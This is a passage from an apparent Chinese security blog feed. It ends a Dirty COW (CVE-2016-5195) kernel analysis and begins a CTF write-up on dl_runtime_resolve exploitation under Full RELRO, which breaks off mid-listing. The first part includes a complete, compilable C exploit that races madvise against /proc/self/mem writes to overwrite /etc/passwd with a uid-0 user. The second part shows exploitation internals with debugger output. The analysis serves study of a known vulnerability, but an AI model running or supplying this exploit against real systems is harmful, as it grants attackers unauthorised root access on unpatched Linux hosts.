class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Let&#x27;s call -&gt;map_pages() first and use -&gt;fault() as fallback</span></span><br><span class="line"><span class="comment"> * if page by the offset is not ready to be mapped (cold cache or</span></span><br><span class="line"><span class="comment"> * something).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops-&gt;map_pages &amp;&amp; fault_around_bytes &gt;&gt; PAGE_SHIFT &gt; <span class="number">1</span>) &#123;</span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">do_fault_around(vma, address, pte, pgoff, flags);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*pte, orig_pte))</span><br><span class="line"><span class="keyword">goto</span> unlock_out;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">unlock_out:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>do_set_pte(vma, address, fault_page, pte, false, false);</code>函数调用，在<code>do_cow_fault</code>函数中同样存在这样的调用<code>do_set_pte(vma, address, new_page, pte, true, true);</code>。可以发现第三个参数也就决定了后面可以获取到的页面，而<code>do_read_fault</code>这里获取的直接就是<code>fault_page</code>，这里就是很简单粗暴的将其移出<code>page_cache</code>，这是因为kernel在面对一个读请求时不会大费周章的再去创建一个<code>dirty COW</code>页。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>使用两个线程跑竞争，在第一个线程完成两次缺页异常的流程之后，第二个线程调用<code>madvise()</code>系统调用将内存页调出，那么第一个线程在尝试第三次获取内存页时便无法正常获取到可读的物理页，此时会再次出发缺页异常，接下来会有一次进入到<code>faultin_page()</code>函数中，而这次返回的内存页其实就是<code>fault_page</code>，并且这个内存页也是不可写状态的，但是在上面的flag中，我们已经去除掉了<code>FOLL_WRITE</code>所以在内核眼中，这是一块用来读的内存页，所以会正常返回处内存页，但是在<code>access_remote_vm</code>中判断读写使用的是<code>write</code>变量，所以实际上我们依旧是在往内部进行写，至此成功实现了越权写。</p><h2 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">char</span> *fake_user;</span><br><span class="line"><span class="keyword">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *username;</span><br><span class="line">    <span class="keyword">char</span> *hash;</span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    <span class="keyword">int</span> group_id;</span><br><span class="line">    <span class="keyword">char</span> *info;</span><br><span class="line">    <span class="keyword">char</span> *home_dir;</span><br><span class="line">    <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">info</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .user_id = <span class="number">0</span>,</span><br><span class="line">        .group_id = <span class="number">0</span>,</span><br><span class="line">        .info = <span class="string">&quot;196082&quot;</span>,</span><br><span class="line">        .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">        .shell = <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="keyword">off_t</span>)<span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info.username = argv[<span class="number">1</span>];</span><br><span class="line">    info.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">                                info.username,</span><br><span class="line">                                info.hash,</span><br><span class="line">                                info.user_id,</span><br><span class="line">                                info.group_id,</span><br><span class="line">                                info.info,</span><br><span class="line">                                info.home_dir,</span><br><span class="line">                                info.shell);</span><br><span class="line">    fake_user = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,</span><br><span class="line">            info.username,</span><br><span class="line">            info.hash,</span><br><span class="line">            info.user_id,</span><br><span class="line">            info.group_id,</span><br><span class="line">            info.info,</span><br><span class="line">            info.home_dir,</span><br><span class="line">            info.shell);</span><br><span class="line"></span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st);</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​    <a class="link"   href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" >https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v4.4/source" >https://elixir.bootlin.com/linux/v4.4/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;CVE-2016-5195就是非常出名的&lt;code&gt;Dirty COW&lt;/code&gt;，俗称&lt;code&gt;脏牛漏洞&lt;/code&gt;。攻击者可以通过</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="page fault" scheme="https://cv196082.gitee.io/tags/page-fault/"/>
    
    <category term="COW" scheme="https://cv196082.gitee.io/tags/COW/"/>
    
    <category term="Race condition" scheme="https://cv196082.gitee.io/tags/Race-condition/"/>
    
  </entry>
  
  <entry>
    <title>dl-runtime-resolve重温</title>
    <link href="https://cv196082.gitee.io/2023/07/28/dl-runtime-resolve/"/>
    <id>https://cv196082.gitee.io/2023/07/28/dl-runtime-resolve/</id>
    <published>2023-07-28T14:27:42.000Z</published>
    <updated>2023-07-28T14:27:06.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在先前其实我已经写过一篇<a href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/">ret2dl-runtime-resolve</a>了。不过在那篇文章中并没有提到当<code>RELRO</code>的等级为<code>FULL</code>的情况下该如何进行利用方法。又因为这类题目一般来说就是模板题目的缘故所以我也就一直没有放在心上，知道这一次巅峰极客遇到了这样一道题目。事先需要提到的是，这道题其实是具有更简单的解题方法的，那就是将got表中read的函数地址写到bss中，随后修改便宜直接调用syscall即可。不过既然取名叫<code>link_map</code>也导致我头铁到一直尝试<code>_dl_runtime_resolve</code>的方式去解决，所以后续的题目都没看。</p><p>因为内核玩的比较多，所以下来看了那一道内核题，题目给的驱动是没有漏洞的，但是因为没有加任何锁的缘故并且内核版本为5.10.x所以可以直接使用<a href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/">堆占位技术</a>直接造成UAF，还算是比较简单，所以不会单独写文章进行复现。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="Full和Partial的区别"><a href="#Full和Partial的区别" class="headerlink" title="Full和Partial的区别"></a>Full和Partial的区别</h3><p>首先最直接的区别就是在Full的情况下got表是不可写的，并且所有符号的在在开始时就会被解析，<code>.got.plt</code>段会被完全初始化为目标函数的最终地址。这也就导致<code>link_map</code>和<code>_dl_runtime_resolve</code>不会被加载。所以首先需要的就是泄漏出<code>link_map</code>和<code>_dl_runtime_resolve</code>函数。</p><h3 id="利用的必要条件"><a href="#利用的必要条件" class="headerlink" title="利用的必要条件"></a>利用的必要条件</h3><p>一、栈溢出</p><p>二、存在一个任意地址读取并且能写到任意地址</p><p>其实有了如上条件之后依旧可以选择的更简单的方式就是读取got表中<code>read</code>函数的地址，并且进行<code>partial write</code>使其最终指向<code>syscall</code>。</p><h3 id="获取link-map"><a href="#获取link-map" class="headerlink" title="获取link_map"></a>获取link_map</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600E10 0C 00 00 00 00 00 00 00 B0 04+Elf64_Dyn &lt;0Ch, 4004B0h&gt;                ; DT_INIT</span><br><span class="line">LOAD:0000000000600E20 0D 00 00 00 00 00 00 00 F4 07+Elf64_Dyn &lt;0Dh, 4007F4h&gt;                ; DT_FINI</span><br><span class="line">LOAD:0000000000600E30 19 00 00 00 00 00 00 00 E8 0D+Elf64_Dyn &lt;19h, 600DE8h&gt;                ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000600E40 1B 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Bh, 8&gt;                      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E50 1A 00 00 00 00 00 00 00 F0 0D+Elf64_Dyn &lt;1Ah, 600DF0h&gt;                ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000600E60 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E70 F5 FE FF 6F 00 00 00 00 98 02+Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt;          ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000600E80 05 00 00 00 00 00 00 00 78 03+Elf64_Dyn &lt;5, 400378h&gt;                  ; DT_STRTAB</span><br><span class="line">LOAD:0000000000600E90 06 00 00 00 00 00 00 00 D0 02+Elf64_Dyn &lt;6, 4002D0h&gt;                  ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000600EA0 0A 00 00 00 00 00 00 00 64 00+Elf64_Dyn &lt;0Ah, 64h&gt;                    ; DT_STRSZ</span><br><span class="line">LOAD:0000000000600EB0 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENT</span><br><span class="line">LOAD:0000000000600EC0 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUG</span><br><span class="line">LOAD:0000000000600ED0 03 00 00 00 00 00 00 00 C0 0F+Elf64_Dyn &lt;3, 600FC0h&gt;                  ; DT_PLTGOT</span><br><span class="line">LOAD:0000000000600EE0 07 00 00 00 00 00 00 00 20 04+Elf64_Dyn &lt;7, 400420h&gt;                  ; DT_RELA</span><br><span class="line">LOAD:0000000000600EF0 08 00 00 00 00 00 00 00 90 00+Elf64_Dyn &lt;8, 90h&gt;                      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F00 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F10 18 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;18h, 0&gt;                      ; DT_BIND_NOW</span><br><span class="line">LOAD:0000000000600F20 FB FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFBh, 1&gt;                ; DT_FLAGS_1</span><br><span class="line">LOAD:0000000000600F30 FE FF FF 6F 00 00 00 00 F0 03+Elf64_Dyn &lt;6FFFFFFEh, 4003F0h&gt;          ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F40 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F50 F0 FF FF 6F 00 00 00 00 DC 03+Elf64_Dyn &lt;6FFFFFF0h, 4003DCh&gt;          ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F60 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL</span><br></pre></td></tr></table></figure><p>在入口处存在一个<code>.dynmic</code>叫做<code>DT_DEBUG</code>，由调试器使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>这里的<code>d_ptr</code>位置只想的是<code>r_debug</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Version number for this protocol.  It should be greater than 0.  */</span></span><br><span class="line">    <span class="keyword">int</span> r_version;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">r_map</span>;</span><span class="comment">/* Head of the chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is the address of a function internal to the run-time linker,</span></span><br><span class="line"><span class="comment">       that will always be called when the linker begins to map in a</span></span><br><span class="line"><span class="comment">       library or unmap it, and again when the mapping change is complete.</span></span><br><span class="line"><span class="comment">       The debugger can set a breakpoint at this address if it wants to</span></span><br><span class="line"><span class="comment">       notice shared object mapping changes.  */</span></span><br><span class="line">    ElfW(Addr) r_brk;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="comment">/* This state value describes the mapping change taking place when</span></span><br><span class="line"><span class="comment">   the `r_brk&#x27; address is called.  */</span></span><br><span class="line">RT_CONSISTENT,<span class="comment">/* Mapping change is complete.  */</span></span><br><span class="line">RT_ADD,<span class="comment">/* Beginning to add a new object.  */</span></span><br><span class="line">RT_DELETE<span class="comment">/* Beginning to remove an object mapping.  */</span></span><br><span class="line">      &#125; r_state;</span><br><span class="line"></span><br><span class="line">    ElfW(Addr) r_ldbase;<span class="comment">/* Base address the linker is loaded at.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>可以看到中间的<code>r_map</code>就是指向<code>link_map</code>的地址了。</p><h3 id="获得-dl-runtime-resolve"><a href="#获得-dl-runtime-resolve" class="headerlink" title="获得_dl_runtime_resolve"></a>获得_dl_runtime_resolve</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>可以看出来<code>link_map</code>其实是一个双向链表的形式，而且其中存在一个相当有用的成员<code>l_info</code>。而其中的<code>DT_PLTGOT</code>的<code>d_tag</code>存放的是got表的地址，那么可以经过多次的<code>l_next</code>的查找得到libc的got表地址进而获得<code>_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *((struct link_map*)0x7fd64bb592e0)-&gt;l_next-&gt;l_next-&gt;l_info[3]</span><br><span class="line"><span class="variable">$13</span> = &#123;</span><br><span class="line">  d_tag = 0x3,</span><br><span class="line">  d_un = &#123;</span><br><span class="line">    d_val = 0x7fd64bb05000,</span><br><span class="line">    d_ptr = 0x7fd64bb05000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; telescope 0x7fd64bb05000</span><br><span class="line">00:0000│  0x7fd64bb05000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc0</span><br><span class="line">01:0008│  0x7fd64bb05008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fd64bb1c160 —▸ 0x7fd64b8ec000 ◂— 0x3010102464c457f</span><br><span class="line">02:0010│  0x7fd64bb05010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fd64bb33c60 (_dl_runtime_resolve_xsave) ◂— endbr64</span><br><span class="line">03:0018│  0x7fd64bb05018 (*ABS*@got.plt) —▸ 0x7fd64ba89b20 (__strnlen_avx2) ◂— endbr64</span><br><span class="line">04:0020│  0x7fd64bb05020 (*ABS*@got.plt) —▸ 0x7fd64ba85750 (__rawmemchr_avx2) ◂— endbr64</span><br><span class="line">05:0028│  0x7fd64bb05028 (realloc@got.plt) —▸ 0x7fd64b914030 ◂— endbr64</span><br><span class="line">06:0030│  0x7fd64bb05030 (*ABS*@got.plt) —▸ 0x7fd64ba87970 (__strncasecmp_avx) ◂— endbr64</span><br><span class="line">07:0038│  0x7fd64bb05038 (_dl_exception_create@got.plt) —▸ 0x7fd64b914050 ◂— endbr64</span><br></pre></td></tr></table></figure><p>可以看到<code>_dl_runtime_resolve_xsave</code>函数就在偏移为<code>0x10</code>的位置了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 